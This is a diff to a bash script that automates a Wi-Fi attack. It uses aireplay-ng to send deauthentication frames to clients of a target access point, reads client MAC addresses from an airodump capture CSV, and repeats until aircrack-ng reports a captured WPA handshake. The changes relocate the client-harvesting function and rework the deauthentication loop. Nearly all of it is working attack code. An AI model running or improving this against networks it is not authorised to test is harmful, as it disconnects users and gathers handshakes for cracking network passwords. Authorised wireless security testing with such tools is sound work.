@@ -26,6 +26,15 @@ function deauthesp {
 	xterm -title "DEAUTHENTICATING CLIENTS" $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic &
 }
 
+# Capture clients MAC
+function getclients {
+nr=0
+	while [ $nr = 0 ]; do
+	cat $name-01.csv | awk 'NR==6,NR==12' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
+	nr=$(cat $mac | wc -l)
+	done
+}
+
 # Kill aircrack-ng family & xterm processes
 function killeverybody {
 	killall aireplay-ng &>/dev/null
@@ -33,14 +42,7 @@ function killeverybody {
 	killall xterm &>/dev/null			
 }
 
-# Refresh clients mac table everytime a new user is added
-function getclients {
-nr=0
-	while [ $nr = 0 ]; do
-	cat $name-01.csv | awk 'NR==6,NR==11' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
-	nr=$(cat $mac | wc -l)
-	done
-}
+
 
 # Time for most functions
 st='0.1'
@@ -261,7 +263,7 @@ tail -n +2 auxfile2 | nl | sed -e 's/^[ \t]*//' > auxfile3
 
 head -n 1 auxfile2 | sed -e 's/^/Network /' > auxfile4
 
-# Finish and store in a file
+# Merge body + banner and finish storing in a file
 
 cat auxfile4 auxfile3 > auxfile5
 
@@ -314,6 +316,8 @@ function ESPSCN {
 		:
 	done
 
+	getclients
+
 	ATTAIR
 }
 
@@ -328,14 +332,13 @@ function ATTAIR {
 
 	aux=1
 	while `aircrack-ng $name-01.cap 2>/dev/null | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
-		getclients
-		echo -e -n "    "
 		while [ $aux -le $nr ]; do
 			bssidclient=$(awk -v var=$aux 'NR==var' $mac)
 			deauthesp
 			let aux=aux+1
 		done
 
+		getclients
 	done
 
 # Clean handshake packet and erase the previous version of .cap
